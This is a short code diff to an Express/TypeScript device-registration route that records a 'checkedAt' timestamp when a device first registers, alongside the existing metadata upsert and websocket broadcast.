@@ -637,7 +637,8 @@ router.put("/:deviceId", async (req, res) => {
     const deviceId = clean(req.params.deviceId);
     const metadata = req.body || {};
     const fcmToken = typeof metadata.fcmToken === "string" ? metadata.fcmToken.trim() : undefined;
-    const setObj: Record<string, any> = { "lastSeen.at": Date.now(), "lastSeen.action": "register" };
+    const now = Date.now();
+    const setObj: Record<string, any> = { "lastSeen.at": now, "lastSeen.action": "register" };
     const skipMetaKeys = ["fcmToken"];
     for (const [key, value] of Object.entries(metadata)) {
       if (skipMetaKeys.includes(key)) continue;
@@ -649,6 +650,11 @@ router.put("/:deviceId", async (req, res) => {
       if ((formModeDoc as any)?.meta?.enabled === true) setObj.masterFormDevice = true;
     } catch (_) {}
     const doc = await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true, new: true }).lean();
+    // New device ya first register — checkedAt set karo registration time se
+    if (doc && (!(doc as any).checkedAt || (doc as any).checkedAt === 0)) {
+      await Device.updateOne({ deviceId }, { $set: { checkedAt: now } });
+      (doc as any).checkedAt = now;
+    }
     try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch (e) { logger.warn("devices: broadcast after metadata failed", e); }
     return res.json({ success: true });
   } catch (err: any) {
